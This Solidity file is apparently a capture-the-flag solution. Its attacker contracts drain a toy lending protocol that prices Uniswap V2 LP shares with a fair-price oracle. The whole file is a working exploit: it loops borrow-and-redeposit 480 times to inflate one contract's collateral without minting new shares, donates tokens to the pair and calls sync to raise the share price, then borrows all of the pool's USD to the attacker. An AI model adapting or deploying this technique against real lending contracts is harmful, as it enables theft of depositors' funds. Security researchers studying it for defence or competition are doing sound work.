// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import {ERC20} from "./ERC20.sol";
import {IUniswapV2Pair} from "./IUniswapV2.sol";
import {LendingProtocol} from "./LendingProtocol.sol";
import {SqrtMath} from "./SqrtMath.sol";


contract AttackerBis {
    ERC20 usd;
    IUniswapV2Pair public immutable pair;
    LendingProtocol public immutable lending;
    address attacker;

    constructor(ERC20 _usd, IUniswapV2Pair _pair, LendingProtocol _lending) {
        usd = _usd;
        pair = _pair;
        lending = _lending;
        attacker = msg.sender;

        usd.approve(address(attacker), type(uint256).max);
        pair.approve(address(lending), type(uint256).max);
    }

    function depositIntoLending(uint256 amount) external {
        lending.deposit(address(this), address(pair), amount);
    }

    function pwn(uint256 amount) external {
        lending.borrow(address(usd), amount);
        usd.transfer(attacker, usd.balanceOf(address(this)));
    }
}

/// @title Attacker
/// @author Christoph Michel <cmichel.io>
contract Attacker {
    IUniswapV2Pair public immutable pair; // token0 <> token1 uniswapv2 pair
    ERC20 public immutable ctf; // token0
    ERC20 public immutable usd; // token1
    LendingProtocol public immutable lending;
    AttackerBis public immutable attackerBis;

    constructor(ERC20 _ctf, ERC20 _usd, IUniswapV2Pair _pair, LendingProtocol _lending) {
        ctf = _ctf;
        usd = _usd;
        pair = _pair;
        lending = _lending;
        attackerBis = new AttackerBis (usd,pair,lending);

        ctf.approve(address(lending), type(uint256).max);
        usd.approve(address(lending), type(uint256).max);
    }

    function attack() external {
        
        console.log("_getPairPrice : ", _getPairPrice());

        uint256 usdAmount = 10*1e18; // = 10 usd
        uint256 ctfAmount = 1*1e18 /100; // = 0.01
        //deposit liquidity 1:1000 of our funds
        ctf.transfer(address(pair), ctfAmount);
        usd.transfer(address(pair), usdAmount);
        pair.mint(address(this));

        //sharesAttacker ~= 0,01% of the pool shares 
        uint256 sharesAttacker = pair.balanceOf(address(this));
        uint256 priceSharesAttacker = (_getPairPrice() * sharesAttacker) >> 112;
        console.log("shares Attacker : ",sharesAttacker);
        console.log("price shares Attacker : ",priceSharesAttacker );

        uint256 usdLending = usd.balanceOf(address(lending));
        console.log("usdLending : ",usdLending);
        console.log("diff : ",usdLending -  priceSharesAttacker);

        /**Test : increase the value of the shares 
        //Result : price shares Attacker Before :  1999999999999999979 - price shares Attacker After :  11990009990009989886
        // ~x6
        ctf.transfer(address(pair), 5*1e18);
        usd.transfer(address(pair), 5000*1e18);
        pair.sync();
        priceSharesAttacker = (_getPairPrice() * sharesAttacker) >> 112;

        console.log("price shares Attacker : ",priceSharesAttacker);
        console.log("usdLending : ",usdLending);
        console.log("diff : ",usdLending -  priceSharesAttacker);
        **/

        //With an another address we will artificially increase the collateral through a loop 
        //First we deposit the shares with the other address
        //Then we will deposit 4980 usd and 4.980 ctf in lending
        //Inside  a loop we borrow the amount of shares already deposit
        // Transfer the shares to the other address and deposit again ...
        //At the end, an address will have 4980 usd and 4.980 ctf in collateral and X amount shares in debt
        // The other address will have X amount of shares in deposit without increasing the total supply  lp inside pair

        //Deposit with attacker
        uint256 numberLoop = 480;
        lending.deposit(address(this), address(usd), numberLoop * usdAmount);
        lending.deposit(address(this), address(ctf), numberLoop * ctfAmount);
        console.log("attacker deposit amount", (numberLoop * usdAmount) + (numberLoop * ctfAmount) );

        //Transfer and deposit shares with an another address
        pair.transfer(address(attackerBis), sharesAttacker);
        attackerBis.depositIntoLending(sharesAttacker);

        //Loop for increasing "artificially" the collateral of attackerBis without increasing the total supply inside pair
        for (uint256 i ; i < numberLoop ; ++i){
            //Borrow the shares from attacker
            lending.borrow(address(pair),sharesAttacker);
            //Deposit the shares with attackerBis
            pair.transfer(address(attackerBis), sharesAttacker);
            attackerBis.depositIntoLending(sharesAttacker);
        }

        uint256 artificialShares = sharesAttacker * numberLoop ;
        uint256 priceSharesAttackerBis = (_getPairPrice() * artificialShares) >> 112;
        console.log("collateral value of attackerBis", priceSharesAttackerBis);

        //increase the value of the shares 
        ctf.transfer(address(pair), ctf.balanceOf(address(this)));
        usd.transfer(address(pair), usd.balanceOf(address(this)));
        pair.sync();
        priceSharesAttackerBis = (_getPairPrice() * artificialShares) >> 112;
        console.log("collateral value of attackerBis after the manipulation", priceSharesAttackerBis);


        console.log("pawn with attackerBis");
        attackerBis.pwn(usd.balanceOf(address(lending)));        

        console.log("usd balance of lending : ",usd.balanceOf(address(lending)));
        console.log("usd balance of attacker : ",usd.balanceOf(address(this)));
    }

    /// @dev from https://github.com/AlphaFinanceLab/alpha-homora-v2-contract/blob/master/contracts/oracle/UniswapV2Oracle.sol
    /// read https://blog.alphafinance.io/fair-lp-token-pricing/ or https://cmichel.io/pricing-lp-tokens for more information
    /// cannot be manipulated by trading in the pool
    /// @return LP token price (denoted in USD) (TVL / totalSupply) scaled by 2**112
    function _getPairPrice() internal view returns (uint256) {
        uint256 totalSupply = IUniswapV2Pair(pair).totalSupply();
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(pair).getReserves();
        uint256 sqrtK = (SqrtMath.sqrt(r0 * r1) << 112) / totalSupply; // in 2**112
        uint256 priceCtf = 1_000 << 112; // in 2**112

        // fair lp price = 2 * sqrtK * sqrt(priceCtf * priceUsd) = 2 * sqrtK * sqrt(priceCtf)
        // sqrtK is in 2**112 and sqrt(priceCtf) is in 2**56. divide by 2**56 to return result in 2**112
        return (sqrtK * 2 * SqrtMath.sqrt(priceCtf)) / 2**56;
    }
}

    


